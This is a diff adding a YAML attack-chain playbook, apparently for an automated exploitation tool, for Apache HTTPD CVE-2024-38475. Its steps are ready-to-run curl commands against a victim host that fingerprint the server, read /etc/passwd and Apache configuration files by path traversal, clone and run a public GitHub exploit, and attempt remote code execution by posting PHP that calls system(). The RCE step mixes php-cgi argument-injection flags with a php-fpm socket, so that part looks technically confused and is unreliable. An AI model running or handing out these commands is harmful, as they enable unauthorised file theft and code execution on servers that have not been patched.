@@ -1,0 +1,65 @@
+chain_id: apache_modrewrite_cve_2024_38475
+title: "Apache HTTPD — CVE-2024-38475 mod_rewrite path confusion → unauth file read & RCE"
+severity: CRITICAL
+tags: [web, apache, mod-rewrite, cve-2024-38475, file-read, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-38475" }
+    - { banner_pattern: "(?i)apache(/|\\s)2\\.4\\.([0-9]|[1-5][0-9])" }
+    - { product_pattern: "(?i)apache.*2\\.4" }
+    - { path_pattern: "(?i)/cgi-bin/.*%3F" }
+
+description: |
+  Apache HTTPD 2.4.0 → 2.4.59: `mod_rewrite` mishandles encoded null
+  bytes / unescaped substitutions in `RewriteRule`, letting an
+  attacker rewrite a benign URL to point at any file the worker
+  process can read. With CGI / SSI / mod_php enabled, the same trick
+  yields unauth RCE because the rewrite target is executed as a
+  script. Mass-scan target since Jul 2024.
+
+steps:
+  - id: 1
+    title: "Fingerprint Apache version (mod_status / banner)"
+    command: |
+      curl -sk -I "http://$VICTIMA/" | grep -i 'server'
+      curl -sk "http://$VICTIMA/server-status" | grep -Eo 'Apache/[0-9.]+'
+
+  - id: 2
+    title: "Probe the bug — read /etc/passwd"
+    command: |
+      curl -sk --path-as-is "http://$VICTIMA/cgi-bin/anything%3F/../../../../../etc/passwd"
+
+  - id: 3
+    title: "Public PoC + nuclei"
+    command: |
+      git clone https://github.com/Abdurahmon3236/CVE-2024-38475 /tmp/apache
+      python3 /tmp/apache/exploit.py -u http://$VICTIMA -f /etc/passwd
+      nuclei -u http://$VICTIMA -t http/cves/2024/CVE-2024-38475.yaml
+
+  - id: 4
+    title: "RCE — abuse a `RewriteRule … fcgi://` to drop into PHP-FPM"
+    command: |
+      # If FastCGI is configured (common on stock LAMP), the rewrite
+      # confusion lets you reach FPM directly with a forged
+      # SCRIPT_FILENAME pointing at any .php you can upload (e.g. via
+      # WebDAV) or — if PHP allows — a data:// stream for direct exec.
+      curl -sk --path-as-is "http://$VICTIMA/cgi-bin/x%3F/php-fpm.sock?-d+allow_url_include%3D1+-d+auto_prepend_file%3Dphp%3A//input" \
+        -d '<?php system("id"); ?>'
+
+  - id: 5
+    title: "Read Apache's own config to find writable paths"
+    command: |
+      curl -sk --path-as-is "http://$VICTIMA/cgi-bin/x%3F/../../../../etc/apache2/apache2.conf"
+      curl -sk --path-as-is "http://$VICTIMA/cgi-bin/x%3F/../../../../etc/httpd/conf/httpd.conf"
+
+common_errors:
+  - error: "Probe returns 404 / 403"
+    solution: |
+      No `RewriteRule` matching the prefix. Re-enumerate with a
+      content-discovery pass (ffuf, gobuster) — find actual rewrite
+      targets in the wild. Patched (≥ 2.4.60) is also a no-op.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-38475
+  - https://httpd.apache.org/security/vulnerabilities_24.html
